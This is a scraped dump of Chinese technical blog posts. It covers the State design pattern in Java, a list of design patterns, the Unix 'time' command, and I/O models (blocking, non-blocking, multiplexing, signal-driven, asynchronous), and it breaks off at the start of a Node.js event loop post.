Client &#123; public static void main(String[] args)&#123; //创建状态 State state = new ConcreteStateB(); //创建环境 Context context = new Context(); //将状态设置到环境中 context.setState(state); //请求 context.request(\"test\"); &#125;&#125; 从上面可以看出，环境类Context的行为request()是委派给某一个具体状态类的。通过使用多态性原则，可以动态改变环境类Context的属性State的内容，使其从指向一个具体状态类变换到指向另一个具体状态类，从而使环境类的行为request()由不同的具体状态类来执行。 示例实现思路 定义Player类表示游戏角色 定义一个PlayerState接口 定义不同的状态类（HealthyState, SurvivalState, DeadState），且它们均实现了PlayerState接口 一个上下文类（GameContext），并包含一个setState()方法： 实现Player.java123456789101112131415public class Player &#123; public void attack() &#123; System.out.println(\"Attack\"); &#125; public void survive() &#123; System.out.println(\"Surviving!\"); &#125; public void dead() &#123; System.out.println(\"Dead! Game Over\"); &#125;&#125; PlayerState.java123public interface PlayerState &#123; void action(Player p);&#125; 各种状态123456789101112131415161718192021222324252627public class HealthyState implements PlayerState &#123; @Override public void action(Player p) &#123; p.attack(); p.fireBumb(); p.fireGunblade(); p.fireLaserPistol(); &#125;&#125;public class SurvivalState implements PlayerState &#123; @Override public void action(Player p) &#123; p.survive(); p.firePistol(); &#125;&#125;public class DeadState implements PlayerState &#123; @Override public void action(Player p) &#123; p.dead(); &#125;&#125; GameContext.Java一个上下文类（GameContext），并包含一个setState()方法： 12345678910111213public class GameContext &#123; private PlayerState state = null; private Player player = new Player(); public void setState(PlayerState state) &#123; this.state = state; &#125; public void gameAction() &#123; state.action(player); &#125;&#125; GameTest12345678910111213141516171819public class GameTest &#123; public static void main(String[] args) &#123; GameContext context = new GameContext(); context.setState(new HealthyState()); context.gameAction(); System.out.println(\"*****\"); context.setState(new SurvivalState()); context.gameAction(); System.out.println(\"*****\"); context.setState(new DeadState()); context.gameAction(); System.out.println(\"*****\"); &#125;&#125; 输出12345678910AttackFire BombFire GunbladeLaser Pistols*****Surviving!Fire Pistol*****Dead! Game Over***** UML图待补充 讨论我们是否可以移除PlayerState接口和其对应的子类，而简化成只通过if-else if来实现： 123456789101112131415161718public class GameContext &#123; private Player player = new Player(); public void gameAction(String state) &#123; if (state == &quot;healthy&quot;) &#123; player.attack(); player.fireBumb(); player.fireGunblade(); player.fireLaserPistol(); &#125; else if (state == &quot;survival&quot;) &#123; player.survive(); player.firePistol(); &#125; else if (state == &quot;dead&quot;) &#123; player.dead(); &#125; &#125;&#125; 从功能实现的角度来说，是没有问题的。 然而，这样的实现违反了开闭原则（Open-Closed Principle），且具有相对较差的可维护性（Maintainability）。 优缺点Reference State Design Pattern in Java 《Java与模式》 《JAVA与模式》之状态模式 - https://www.cnblogs.com/java-my-life/archive/2012/06/08/2538146.html","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】设计模式概念","date":"2018-11-11T13:30:18.000Z","path":"2018/11/11/【Design-Pattern】设计模式概念/","text":"分类 创建型模式（Creational Pattern）- 5种 抽象工厂模式（Abstract Factory Pattern） 建造者模式（Builder Pattern） 工厂方法模式（Factory Method Pattern） 原型模式（Prototype Pattern） 单例模式（Singleton Pattern） 行为型（Behavioral Pattern）-11种 命令模式（Command Pattern） 中介者模式（Mediator Pattern） 观察者模式（Observer Pattern） 状态模式（State Pattern） 策略模式（Strategy Pattern） 职责链模式（Chain of Responsibility Pattern） 解释器模式（Interpreter Pattern） 迭代器模式（Iterator Pattern） 备忘录模式（Memento Pattern） 模板方法模式（Template Method Pattern） 访问者模式（Visitor Pattern） 结构型（Structural Pattern）- 7种 适配器模式（Adapter Pattern） 桥接模式（Bridge Pattern） 组合模式（Composite Pattern） 装饰模式（Decorator Pattern） 外观模式（Facade Pattern） 享元模式（Flyweight Pattern） 代理模式（Proxy Pattern） Reference Wikipedia - Software design pattern 《Design patterns : elements of reusable object-oriented software》","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Markdown】Markdown中的数学符号与公式","date":"2018-11-10T04:04:44.000Z","path":"2018/11/10/【Markdown】Markdown中的数学符号与公式/","text":"Referencehttp://web.ift.uib.no/Teori/KURS/WRK/TeX/symALL.html https://oeis.org/wiki/List_of_LaTeX_mathematical_symbols http://jzqt.github.io/2015/06/30/Markdown%E4%B8%AD%E5%86%99%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/ https://blog.csdn.net/Katherine_hsr/article/details/79179622 https://www.jianshu.com/p/7c34f5099b7e","comments":true,"categories":[{"name":"Markdown","slug":"Markdown","permalink":"http://swsmile.info/categories/Markdown/"}],"tags":[{"name":"Markdown","slug":"Markdown","permalink":"http://swsmile.info/tags/Markdown/"}]},{"title":"【Linux】命令 - time命令","date":"2018-11-06T12:55:31.000Z","path":"2018/11/06/【Linux】命令-time命令/","text":"由于自己使用macOS，因此以下所有测试都macOS下进行。而macOS中的time与Linux中的time命令是几乎几乎完全相同的。 Demo我们执行一个node任务，并测试它的耗时： 12$ time node main.jsnode main.js 4.95s user 0.06s system 97% cpu 5.139 total 我们得到了4个数字，接下来分别来解释： 4.95s user 0.06s system 97% cpu 5.139 total total值5.139 total最为简单，表示整个任务执行的总时长，即当开始执行node main.js的那一刻，我们看了一下手表，再执行结束时，又看了一下手表。两次时间的差值就为total的值。 一句话概括，total表示该任务进行的绝对时长。 在Linux中，real值即对应这里的total值。比如，在Linux中执行一次time命令： 1234$time file1real 0m0.003suser 0m0.000ssys 0m0.004s 执行一个较为特殊的例子： 12$ time sleep 2sleep 2 0.00s user 0.00s system 0% cpu 2.008 total sleep 2会让当前进程的主线程休眠2秒，可以看到这个进程总共存活了2.008秒。 在介绍user值和system值之前，我们先介绍两个概念。 内核态（Kernel Mode）在内核态时，当前执行的代码拥有完全的、不受限制的访问底层硬件（underlying hardware）的能力。它可以执行任何CPU指令或者引用任何内存地址。当处在内核态时，通常都在执行由操作系统提供的最底层的、可靠的代码。 如在处在内核态时，发生了崩溃，这将会是灾难性的，因为这个崩溃会影响整个操作系统的运行。 用户态（User Mode）在用户态时，当前执行的代码不具备直接访问底层硬件或内存的能力。代码必须通过调用操作系统API（通常是系统调用，System Call）来访问底层硬件或内存。 通过因此内核态和用户态的隔离机制，使得处于用户态的崩溃都可以被恢复。 我们的大部分代码都运行在用户态状态下。 引入了上述概念后，这两个值就非常容易理解了。 user值即user time，即一个进程执行过程中，代码处于用户态过程所经历的CPU时间。 system值即system time，即一个进程执行过程中，代码处于内核态过程所经历的CPU时间。 cpu值即CPU利用率（CPU usgae），即在一个进程执行过程中，CPU的利用率。 CPU_usage = (user time + system time)/ total time * 100% 在上面node的例子中： 4.95s user 0.06s system 97% cpu 5.139 total (4.95 + 0.06)/5.139 = 97.489784%约等于97%，因此，我们认为这个进程的执行过程中，CPU的利用率很高。 在sleep 2的例子中 0.00s user 0.00s system 0% cpu 2.008 total (0.00 + 0.00)/2.008 = 0%，即CPU的利用率为0，事实上，这个进程中的主线程仅仅的休眠了2s，此后这个进程就被结束了。 这个过程中，不存在任何处于用户态和内核态的执行代码。 误区解释误区1：total_time = user_time + sys_time这显然是不对的，比如在前面的sleep 2的例子中，2.008 ≠ 0.00 + 0.00。 误区2：total_time &gt; user_time + sys_time这不是绝对正常的。只是在大部分单线程执行的情况下，往往都会呈现total_time &gt; user_time + sys_time。 比如在上面node的例子中，就符合了total_time &gt; user_time + sys_time的情景。 5.139 &gt; 5.01 = 4.95 + 0.06 然而，在使用多线程/多进程执行一个应用时，就可能会出现total_time &lt; user_time + sys_time。 比如，以下的Node的程序中，通过使用cluster模块同时开启八个进程，就出现了total_time &lt; user_time + sys_time的情况。 1234567891011121314151617181920212223var cluster = require('cluster');var numCPUs = 8;function fibo (n) &#123; return n &gt; 1 ? fibo(n - 1) + fibo(n - 2) : 1;&#125;console.time('8 cluster');if (cluster.isMaster) &#123; // Fork workers. for (var i = 0; i &lt; numCPUs; i++) &#123; cluster.fork(); &#125; var i = 8; cluster.on('exit', function(worker, code, signal) &#123; if(!--i)&#123; console.timeEnd('8 cluster'); process.exit(0); &#125; &#125;);&#125; else &#123; //console.log(fibo (40)); process.exit(0);&#125; 使用time： 123$ time node main.js8 cluster: 3126.211msnode main.js 21.71s user 0.34s system 684% cpu 3.221 total 结论“total_time” 与 ”user_time + sys_time的和“之间没有任何关系。 Referencehttp://stackoverflow.com/questions/556405/what-do-real-user-and-sys-mean-in-the-output-of-time1","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Operating System】I/O - 同步、异步与阻塞、非阻塞I/O问题","date":"2018-11-06T07:47:27.000Z","path":"2018/11/06/【Operating-System】IO-同步、异步与阻塞、非阻塞I-O问题/","text":"软硬件层面的同步/异步硬件在现代操作系统中，I/O是一种与外围设备（peripherals）进行数据交换的方式，I/O包括读或写数据到磁盘/SSD中，或通过网络发送/接收数据，显示信息到显示器上，接收鼠标或键盘的输入。 因此，我们通常说的I/O，不仅仅只限于磁盘文件的读写。*nix将计算机抽象了一番，磁盘文件、硬件、套接字等几乎所有计算机资源都被抽象为了文件。 实现硬件层面异步的机制称为硬件中断（hardware interrupt）。 在典型的硬件同步（synchronous）场景中，当CPU请求外围设备读取数据时，CPU会进入一个无限循环（infinite loop），在循环中CPU需要不断去检查外围设备是否已经将数据读取到了，这个过程称为轮询（poll）。 而在现代硬件中，当CPU向外围设备发送I/O请求后，就会立刻去执行其他CPU指令（而不是不断的轮询）。当外围设备将数据准备完成后，它会通过电路中断（circuit interrupt）向CPU发送一个信号（signal）。这就是典型的硬件异步（asynchronous）场景。因此，CPU就不再需要静静的等待且不断轮询直到外围设备将数据准备完成，因而大大的提高了CPU的利用率。 软件操作系统作为一层中间件，抽象了硬件设备，向应用程序以系统调用（System Call）的形式提供I/O操作服务。 类似地，当应用程序（通过调用系统调用）发起一个I/O操作后，操作系统会调用对应的设备驱动（device driver）以操作硬件进行这个I/O操作。 对于这个应用程序来说，如果此时需要静静的等待（或者不断的轮询），直到数据被准备完成后，这就是软件层面的同步，这样的编程方式称之为同步编程（synchronous programming）。 如果操作系统允许应用程序声明一个回调函数（callback），且当I/O操作完成后，操作系统会自动调用这个回调函数，这就是软件层面的异步，这样的编程方式称为异步编程（asynchronous programming）。 设备管理以实现I/O操作硬件设备向计算机提供输入和输出数据的能力，在这个过程中： 应用程序调用操作系统提供的系统调用API（System Call API）来让操作系统进行I/O操作 操作系统请求设备驱动提供的API来完成I/O操作 不同的硬件设备对应不同的设备驱动，这些设备驱动知道如何让特定的硬件设备完成特定的I/O操作 I/O模型阻塞I/O模型（Blocking I/O Model）操作系统内核对于I/O只有两种方式：阻塞与非阻塞。在调用阻塞I/O时，用户线程需要等待 I/O操作完全完成（等待数据被拷贝到内核空间的缓冲区（buffer），数据从内核缓冲区被拷贝到用户线程对应的用户空间缓冲区）后，才能得到结果（内核返回数据给用户线程），如下图所示： 具体来说： 系统调用：用户线程调用read()这个系统调用（System Call）； 操作系统内核读取数据：无论对于网络IO还是磁盘IO，外部设备需要一定的时间读取该数据（对于网络I/O，就是等待远端数据完成被传输到本地；对于磁盘I/O，就是等待数据从磁盘上被拷贝到内核中）。并且，在外部设备读取完毕后，操作系统内核（kernal）需要一定的时间将该数据读取到操作系统内核的缓冲区。在这个过程中，用户线程会被阻塞（此后，操作系统会将该进程置于休眠状态（sleep））； 复制到用户内存并返回数据：出于系统安全考虑，用户态的程序是没有权限直接读取内核态内存（内核的缓冲区）的。因此，当操作系统内核已经将数据拷贝到其内核缓冲区（Buffer）后，内核会负责将数据拷贝到用户进程缓冲区（属于用户进程的特定内存区）。此后，这个用户线程会被操作系统从休眠状态置为唤醒状态（wake）。 注意，这里仅仅以读取（对应read()系统调用）为例，而除此之外，还可以进行write()、connect()、open()等其他的系统调用（这些系统调用都是等价的（equivalent））。在下文中，也均以read()为例。 阻塞I/O模型与同步编程阻塞I/O的一个特点是一定要等到系统内核层面完成整个I/O操作后（以已经将数据读取到用户内存中后作为完成的标志），调用才结束（体现为内核将数据和程序的控制流返回给用户线程）。这时，这个用户线程对应的线程从阻塞状态（Blocked）转化为活跃状态。 以这样的思维方式进行的编程，通常也成为同步编程（Synchronous Programming）。 阻塞I/O模型的不足阻塞I/O造成CPU等待I/O，导致CPU在一段时间内等待，最终CPU的处理能力没有得到充分利用。 在基于用户图形界面的场景中（无论是基于浏览器，还是基于传统桌面应用），处理用户操作的线程与主线程通常是同一个线程。此时，若主线程进行一个同步的长耗时I/O操作（比如读取一个文件、进行网络传输），图形界面将一直保持无响应的情况（此时自然其也无法处理用户与界面间的交互），直到这个I/O操作结束。 我们通常用以下两种方式中任一种来解决这个问题： 使用多线程：使用一个新的线程（非主线程）来进行I/O操作，这样就不会因进行I/O操作造成的等待而导致图形界面出现无响应的情况。当然，虽热因为主线程没有被I/O操作所阻塞。因此，用户可以与图形界面进行正常的交互。但是，这时CPU的处理能力仍然没有得到充分利用（CPU需要将被阻塞的线程进行上下文切换）； 采用异步编程（Asynchronous Programming）：异步编程必须依赖于操作系统提供的异步I/O系统调用，或者由软件中间件抽象后提供的异步API（比如Node.js）。当I/O操作真正完成时（已经将期望的数据复制到内存用户态中），内核通过回调函数（callback）或信号量的方式通知应用程序。 非阻塞I/O模型（Nonblocking I/O Model）为了提高性能， 内核提供了非阻塞I/O。如图所示： 具体来分析： 系统调用：用户线程设置此I/O为非阻塞操作，并调用read()这个系统调用（System Call）。 操作系统内核立刻返回结果：在这个过程中，用户线程不会被阻塞（因此，该线程也不会被置为休眠状态）。当用户线程进行系统调用后，内核会立即返回一个EWOULDBLOCK错误码，以标识I/O数据并未准备完毕。 用户线程不断发起系统调用：由于当I/O数据准备完毕后，内核不会主动通知用户线程。 因此，用户线程需要以一定的频率不断的发起read()系统调用，以询问该数据是否准备完毕（准备完毕的标志为数据已经被拷贝到内核缓冲区）。这个过程称为轮询（poll）。 在数据准备完毕前，用户线程在每次进行系统调用时，内核都会返回一个EWOULDBLOCK错误码，以标识I/O数据并未准备完毕。 在整个轮询过程中，虽然用户线程每次发起系统调用后可以立即返回，但是为了等到数据，仍需要不断地轮询、重复请求，因此轮询操作会消耗了大量的 CPU 的资源。 复制到用户内存并返回数据：当操作系统内核已经将数据拷贝到其内核缓冲区（Buffer）后，用户线程再发起read()这个系统调用（System Call）时，内核会将数据内核缓冲区拷贝到用户内存，并将数据返回给用户线程 非阻塞I/O模型托与阻塞I/O模型的区别非阻塞I/O跟阻塞I/O的本质差别在于，当用户线程发起一个系统调用（System Call）后，控制流是否会被系统内核立即返回。若会被立即返回，则为非阻塞I/O。 具体来说，在非阻塞I/O中，在用户线程进行系统调用（System Call）后，控制流会被系统内核立即返回（此时数据并没有准备完成，因此仅仅返回控制流，而不包括期望的I/O数据）。而在阻塞I/O中，只有当数据准备完成（体现为数据已经被拷贝到用户内存）后，系统内核才会返回控制流（并附带对应的I/O数据）。 需要特别注意的是，非阻塞模型也可以进一步细分为同步模式和异步模式。由于完整的I/O并没有完成，立即返回的并不是用户线程期望的数据，而仅仅是当前调用的状态。因此，在同步非阻塞模型，为了获取完整的数据，应用程序需要重复调用系统调用以确认I/O操作是否已经完成。这种重复调用判断操作是否完成的技术叫做轮询；而对于异步非阻塞模型，当I/O操作完成后，内核会通过向用户线程发送信号的方式唤醒这个线程且通知I/O操作完成，因此此时不需要进行轮询。在一些资料中，通常默认非阻塞模式是同步的，而事实上非阻塞模型也可以用异步的方式进行，此时就不再需要轮询了。 另外，现代操作系统对计算机进行了抽象，将每一次I/O操作和所有输入输出设备抽象为文件。因此， 内核在进行I/O 操作时，是通过文件描述符（File Descriptor）进行管理的，一个I/O操作对应于一个文件描述符，文件描述符类似于应用程序与系统内核之间的凭证。应用程序如果需要进行I/O调用，需要先打开文件描述符，然后再根据文件描述符去实现I/O操作的数据读写。此处，非阻塞I/O与阻塞I/O的区别在于阻塞I/O会完成整个获取数据的过程（以将数据复制到用户空间作为完成标志），而非阻塞I/O则不带数据返回（控制流返回时，只意味着数据已经被复制到内核空间）。要获取数据，还需要通过文件描述符进行读取（目的是将数据从内核态拷贝到用户态）。 任意技术都并非完美的。阻塞I/O造成CPU等待浪费，非阻塞（对于同步非阻塞模式而言）可能带来需要不断轮询去确认是否完全完成数据获取的麻烦。粗暴的轮询操作，可能会浪费CPU资源。这里我们且看轮询技术是如何演进的，以减小因不断判断I/O状态对CPU资源的消耗。 I/O多路复用模型 （I/O Multiplexing Model）I/O多路复用模型是非阻塞I/O模型的延伸，因为I/O多路复用模型允许用户线程可以阻塞地同时检测多个文件描述符对应的I/O操作（每个文件描述符对应一个I/O操作）。 当这些文件描述符对应的I/O操作中任何一个（或多个同时）数据准备完成（数据已经被拷贝至内核空间）时，内核或主动通知用户线程并返回控制流。 Linux提供了三种方式来实现I/O多路复用模型：select、poll和epoll方法。关于这几种I/O多路复用模型的区别，在【Linux】Linux 中的 I/O 轮询技术 中进行了详细的讨论。 我们以select为例，I/O多路复用模型如下图所示： 具体来分析： 调用read()系统调用：用户线程以非阻塞的方式发起一个I/O操作。注意，这里read()系统调用可以被非阻塞的调用多次以触发多个I/O操作。 调用select()系统调用：用户线程调用select()系统调用。当多个文件描述符中一个或多个数据准备完成（数据已经拷贝到内核空间）后，系统调用返回控制流给用户线程（并标识数据已可读）。注意，在此过程中，用户线程是被阻塞的。 调用read()系统调用：调用read()系统调用以拷贝数据到用户空间。同样，在此过程中，用户线程也是被阻塞的。 之所以说”I/O多路复用模型是非阻塞I/O模型的延伸“，是因为在传统的非阻塞I/O模型中，一次read()系统调用只能探测到一个I/O操作的数据是否已经准备完成了。在这个过程中，虽然不断调用read()的过程是非阻塞的，但是当数据准备完成时（数据已经被拷贝至内核空间），再次调用read()以将数据从内核空间拷贝至用户空间的过程是阻塞的。下图描述了这个过程： 而前面也提到了，I/O多路复用模型允许用户线程可以阻塞地同时等待多个文件描述符对应的I/O操作。事实上，Linux中的select、poll和epoll三种轮询实现对应的轮询系统调用，都会阻塞用户线程，若下图所示： 因此，将I/O多路复用模型与最朴素的非阻塞I/O模型进行对比，从底层实现来说，前者已经将轮询操作从由用户线程负责转移到了由内核负责。 注意，select、poll和epoll均只是不同的轮询技术的实现。因此，在轮询之前，用户线程已经通过非阻塞的系统调用发起了I/O操作。而select、poll和epoll本身既不包括非阻塞地发起I/O操作这个过程，也不包括数据已经准备完成后，用户线程发起read()去读取去数据（以将数据从内核空间拷贝至用户空间）的过程。 阻塞I/O模型与I/O多路复用模型将阻塞I/O模型与I/O多路复用模型进行比对，我们发现： 表面看来，使用I/O多路复用模型没有得到任何好处（在分别将数据读取至内核空间和从内核空间拷贝至用户空间的两个阶段中，用户线程都是被阻塞的）。而且更糟的是，对于一次I/O操作，I/O多路复用模型还需要发起两次系统调用（select()和read()），而阻塞I/O模型只需要发起一次（read()）。 而实际上，使用I/O多路复用的好处在于我们可以在一个线程内同时处理多个I/O请求（通过等待多个文件描述符）。当任何一个或多个文件描述符的I/O操作完成时，用户线程被内核唤醒。 多线程调用阻塞I/O模型（Multithreading with blocking I/O Model）另外，看起来，使用多线程调用阻塞I/O与I/O多路复用很类似。即，在这两个模型中，从“用户线程发起系统调用到数据被准备完成并被复制到内核空间”和“数据从内核空间被复制到用户空间”的这两个过程中，用户线程均是被阻塞的。 而且对于I/O多路复用，在轮询结束后，每一次read()调用都只能执行一个I/O操作，因此调用select()后需要多次调用read()。而多线程调用阻塞I/O使用多线程（一个文件描述符对应一个线程）来同时调用阻塞I/O，则当任何一个线程完成了select()后，可以立即调用对应的read()。因此，多个文件描述符对应的read()调用可以被同时（concurrently）进行。 看起来I/O多路复用似乎一无是处。而事实上，在多线程调用阻塞I/O时，CPU的利用率不高，因为CPU需要进行大量的线程上下文切换（线程被I/O阻塞后进行休眠状态，当I/O完成后，该线程从休眠变为活跃状态）。 信号驱动 I/0 模型（Signal-Driven I/O Model） 调用sigaction()系统调用：用户线程开启信号驱动 I/0，并调用sigaction()系统调用来初始化信号处理程序（Signal Handler） 系统调用立刻返回：当调用sigaction()系统调用后，该系统调用会被内核立刻返回，此后用户线程不会被阻塞 获得SIGIO信号：当数据已经准备完成（已被拷贝到内核空间后），内核会向用户线程中的信号处理程序发送一个SIGIO信号 调用read()系统调用：在用户线程获得SIGIO信号后，可以调用read()系统调用以获得数据 信号驱动 I/0 模型的优点在于用户线程不需要阻塞地等待内核拷贝数据至内核空间，而是当拷贝完成后，用户线程会收到拷贝完成的通知。 异步 I/O 模型（Asynchronous I/O Model）异步 I/O（Asynchronous I/O） 即AIO，也可称为POSIX AIO。 在《Unix网络编程》一书中对同步IO和异步IO的定义是这样的：An asynchronous I/O operation does not cause the requesting process to be blocked. 即，请求 I/O 操作的进程不会被异步 I/O 操作阻塞。因此，异步 I/O 一定是非阻塞的。异步I/O通常与事件通知（Event Notification）关联。 过程： 发起系统调用：用户线程发起aio_read()（POSIX的异步I/O函数名称总是以aio_或lio_开头）系统调用后，内核会立即返回控制流给用户线程 通知用户线程：当数据准备完成，并已经从内核空间拷贝至用户空间后，内核会通过发送信号（signal）的方式主动通知用户线程 信号驱动 I/0 模型与异步I/O模型的区别信号驱动 I/0 模型与异步I/O模型的区别在于，前者在当数据被拷贝到内核空间后就通知用户线程（此后还要经历将数据拷贝至用户空间的过程），而后者会在数据被拷贝至用户空间后才通知用户线程（此时，数据对用户程序而言，已经可用）。因此，对后者来说，在数据从内核空间拷贝至用户空间的过程，用户线程是被阻塞的；而对前者来说，用户线程在整个I/O操作过程中，没有发生任何阻塞。因此，异步I/O可以提高吞吐量、缩短响应时间。 总结比较以上五种模型（阻塞I/O模型、非阻塞I/O模型、I/O多路复用模型、信号驱动 I/0 模型和异步I/O模型）。只有在异步I/O模型中，在数据从内核空间拷贝至用户空间的过程，用户线程是不被阻塞的（而在前四种模型中，都是被阻塞的）。 再次强调，非阻塞I/O跟阻塞I/O的本质差别在于，当用户线程发起系统调用（System Call）后，控制流是否会被系统内核立即返回。若会被立即返回，则为非阻塞I/O。 POSIX中的I/O调用方法 Blocking Non-blocking Synchronous write()，read()，open()，close() write()，read()，open()，close() + poll() or select() Asynchronous - aio_write(), aio_read() 同步I/O与异步I/OPOSIX中分别定义了这两种模式： 同步I/O（Synchronous I/O）：同步I/O会不同程度地阻塞用户线程。 阻塞同步I/O：从用户线程调用系统调用以发起I/O操作至数据可用（被拷贝至用户空间）的整个过程中，用户线程均被阻塞； 非阻塞同步I/O：从用户线程调用系统调用以发起I/O操作至数据被拷贝至内核空间过程中，用户线程不会被阻塞（此过程中会进行轮询操作）；而数据从内核空间被拷贝至用户空间的过程中，用户线程会被阻塞； 异步（Asynchronous I/O）：异步I/O并不会阻塞用户线程，用户线程发起I/O操作后，完全可以去处理其他事务。而当而I/O操作完成时（数据已拷贝至用户空间），内核会通知用户线程（此时用户线程也不需要发起轮询操作）。 总结1： 同步I/O可以以阻塞或非阻塞的方式进行。当以同步阻塞的方式进行时，用户线程会被一直阻塞，直到I/O操作完成；当以同步非阻塞的方式进行时，需要进行轮询操作； 异步I/O只能以非阻塞的方式进行。在这种其情况下，当I/O操作完成后，内核会以发送信号的方式通知。 总结2： 从同步阻塞I/O模型到同步非阻塞I/O模型，缺点在于用户线程的逻辑相对更复杂了（因为多了轮询的逻辑），同时这也增加了对CPU资源的耗费；而优点在于可以只用一个线程实现同时等待多个文件操作符（一旦有任何一个文件操作符对应的I/O操作完成，则立即返回控制流给用户线程） 而从同步非阻塞I/O模型到异步I/O模型，缺点在于需要以异步编程的思维方式思考，且客观上增加了进行异常处理的复杂性；而优点在于真正将CPU资源的耗费将至最低（因为不再需要轮询了）。 存疑点目前按个人的理解（同时参考了几本较为权威介绍Linux编程的书籍，包括《Unix Network Programming, Volume 1: The Sockets Networking API: Sockets Networking API》和《Linux System Programming Talking Directly to the Kernel and C Library》）： 非阻塞I/O跟阻塞I/O的本质差别在于，当用户线程发起系统调用（System Call）后，控制流是否会被系统内核立即返回。若会被立即返回，则为非阻塞I/O。 同步I/O与异步I/O的本质区别在于：当用户进行通过调用系统调用发起一个I/O后，内核会不会在这个I/O操作完成（数据拷贝至用户空间）后主动通知用户线程，且在此通知发生之前，用户线程不再需要关注且处理这个I/O操作（也不会被阻塞）。若会主动通知，则为异步I/O。 因此： 所有存在轮询操作的I/O均为同步I/O，不管是select、poll甚至是epoll 非阻塞I/O并不意味着真个I/O过程中，用户线程没有发生任何阻塞。事实上，在调用select()和poll()时，均会发生阻塞；而且，在轮询完成后，将数据从内存空间复制到用户空间的过程中，也同样会发生阻塞 而有的blog（如 使用异步 I/O 大大提高应用程序的性能）中认为所有的I/O多路模型（包括select、poll和epoll）均属于异步I/O， 且属于异步阻塞 I/O。如下图所示： 个人不是非常赞同这种分类。因为从操作系统角度而言，在I/O多路模型中，虽然内核会将数据已经被准备完成的I/O操作对应的文件描述符放到一个”已完成“集合中。但对于应用程序而言，仍然需要进行轮询操作（而不是在I/O操作完成后，应用程序得到主动的通知，并触发相应的事件回调）。因此，个人认为I/O多路模型仍然应归属到同步模型。 然而，通过中间件通过线程池+I/O多路模型，可”模拟“出异步。Node就是一个典型的例子。即对应Node应用程序而言，完全是异步的（一个I/O操作被触发后，当数据被拷贝到用户态时，开发者声明的回调函数回被自动触发）。之所以称之为”模拟的异步“，是从其层依赖的操作系统系统调用而言的，即Node底层依赖的操作系统系统调用并不是异步的，而是线程池+I/O多路模型。 现实的异步I/O现实比理想要骨感一些，但是要达成异步I/O的目标，并非难事。前面我们将场景限定在了单线程的状况下，多线程的方式会是另一番风景。 通过让部分线程进行阻塞I/O或者非阻塞I/O加轮询技术来完成数据获取，让一个线程进行计算处理，通过线程之间的通信将I/O得到的数据进行传递，这就轻松实现了“异步I/O”。 这种“异步I/O”不能称之为严格意义上的异步I/O。因为严格意义上的异步，工作线程是不会因为I/O而被阻塞的，因此它在发起I/O请求后，仍然可以去做其他事情。 而从用户线程的角度说，这是异步I/O。然而，对应内核或者CPU而言，无论是采用阻塞还是非阻塞的方式，都没有将CPU资源利用最大化。这是相较于真正意义上的异步I/O而言，因为，前者开启了多线程，这增加了CPU资源的耗费；而后者在此基础之上，还需要进行轮询操作，更加增加了CPU资源的耗费。 glibc的AIO便是典型的线程池模拟异步I/O。然而遗憾的是，它存在一些难以忍受的缺陷和 bug，不推荐采用。libev的作者Marc Alexander Lehmann重新实现了一个异步I/O的库：libeio。libeio 实质上依然是采用线程池与阻塞I/O模拟异步I/O。 边缘触发AIO（Edge-triggered AIO）与水平触发 AIO （level-triggered AIO）边缘触发AIO（Edge-triggered AIO）水平触发 AIO（level-triggered AIO）Reference 《Unix Network Programming, Volume 1: The Sockets Networking API: Sockets Networking API》 《Linux System Programming Talking Directly to the Kernel and C Library》 I/O Multiplexing - http://www.cs.toronto.edu/~krueger/csc209h/f05/lectures/Week11-Select.pdf 6.2. Waiting for I/O - http://faculty.salina.k-state.edu/tim/ossg/Device/io_wait.html The method to epoll’s madness - https://medium.com/@copyconstruct/the-method-to-epolls-madness-d9d2d6378642 Overview of Blocking vs Non-Blocking - https://nodejs.org/en/docs/guides/blocking-vs-non-blocking/ Chapter 6. I/O Multiplexing: The select and poll Functions - https://notes.shichao.io/unp/ch6/ Synchronous and Asynchronous I/O - https://docs.microsoft.com/en-us/windows/desktop/fileio/synchronous-and-asynchronous-i-o non-blocking IO vs async IO and implementation in Java - https://stackoverflow.com/questions/25099640/non-blocking-io-vs-async-io-and-implementation-in-java https://www.rubberducking.com/2018/05/the-various-kinds-of-io-blocking-non.html","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Node.js】Node.js 的 Event Loop 与异步 I/O","date":"2018-11-06T07:42:40.000Z","path":"2018/11/06/【Node-js】Node-js的Event-Loop与异步IO/","text":"事件循环（Event Loop）Node的执行模型称为事件循环（Event Loop）。在Node进程启动后，Node会用主线程来执行所有用户代码。当主线程对应的栈为空时（所有用户代码执行完毕了）Node会开始执行一个类似while(true)的事件循环（Event Loop）（从Node代码实现的角度来说，并不存在这样的while(true)）。 每一次执行循环体的过程都称为一个Tick。每一个Tick的过程就是查看是否有需要处理的事件（分布于不同阶段中），每个阶段依次被执行，每个阶段中存在关联的回调函数。如果不再有事件处理，就退出Node进程。 浏览器采用了类似的机制。事件可能来自用户的点击或者加载某些文件时产生，而这些产生的事件都有对应的观察者。在Node中，事件主要来源于网络请求、文件I/O等，这些事件对应的观察者有文件I/O观察者、网络I/O观察者等。观察者将事件进行了分类。 事件循环是一个典型的生产者/消费者模型。异步I/O、网络请求等则是事件的生产者，源源 不断为Node提供不同类型的事件，这些事件被传递到对应的观察者那里，事件循环则从观察者那里取出事件并处理。 在Windows下，这个循环基于IOCP创建，而在*nix下则基于多线程创建。 对于I/O操作，Node使用了自己设计的libuv，libuv是一个基于事件驱动的跨平台抽象层，封装了不同操作系统一些底层特性，对外提供统一的API。具体来说， 事件循环的各个阶段（Phase）123456789101112131415161718 ┌───────────────────────────┐┌─&gt;│ timers ││ └─────────────┬─────────────┘│ ┌─────────────┴─────────────┐│ │ pending callbacks ││ └─────────────┬─────────────┘│ ┌─────────────┴─────────────┐│ │ idle, prepare ││ └─────────────┬─────────────┘ ┌───────────────┐│ 